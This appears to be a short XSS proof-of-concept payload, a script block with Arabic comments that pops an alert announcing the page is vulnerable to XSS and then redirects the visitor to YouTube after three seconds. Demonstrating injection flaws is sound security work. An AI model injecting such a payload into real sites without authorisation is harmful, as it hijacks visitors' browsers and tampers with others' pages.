<script>
// 1. عرض تحذير للمستخدم
alert("⚠️ This page is vulnerable to XSS!");

// 2. إعادة التوجيه إلى YouTube بعد 3 ثواني
setTimeout(() => {
  window.location.href = "https://www.youtube.com";
}, 3000);
</script>